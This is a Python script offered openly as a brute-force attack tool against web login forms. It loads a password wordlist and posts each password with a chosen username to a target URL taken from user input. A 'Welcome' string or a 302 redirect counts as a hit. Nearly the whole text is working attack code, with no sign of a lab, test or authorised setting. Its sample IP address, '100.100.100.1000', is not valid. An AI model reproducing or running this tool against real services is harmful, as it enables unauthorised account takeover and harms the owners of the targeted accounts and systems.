import requests

def brute_force_login(url, username, password_file_path):
    # Open password file
    try:
        with open(password_file_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print("[!] Password file not found. Check the path.")
        return

    print(f"[*] Starting brute-force attack on {url} with username '{username}'...")
    
    for password in passwords:
        # Create data to send in POST request
        data = {
            "username": username,
            "password": password
        }
        
        try:
            response = requests.post(url, data=data, timeout=5)

            # You need to customize this according to the success message!
            if "Welcome" in response.text or response.status_code == 302:
                print(f"[+] Password found: {password}")
                return
            else:
                print(f"[-] Attempt failed: {password}")
        
        except requests.exceptions.RequestException as e:
            print(f"[!] Error connecting to {url}: {e}")
            continue
    
    print("[*] Brute-force attack finished. No password found.")

if __name__ == "__main__":
    target_ip = input("Enter Target IP Address (e.g., 100.100.100.1000): ").strip()
    port = input("Enter Port (default 80 if unknown): ").strip()
    path = input("Enter Login Path (e.g., /login): ").strip()
    username = input("Enter Username (e.g., admin): ").strip()
    password_file = input("Enter Path to Password File: ").strip()

    if port == "":
        port = "80"

    full_url = f"http://{target_ip}:{port}{path}"

    brute_force_login(full_url, username, password_file)
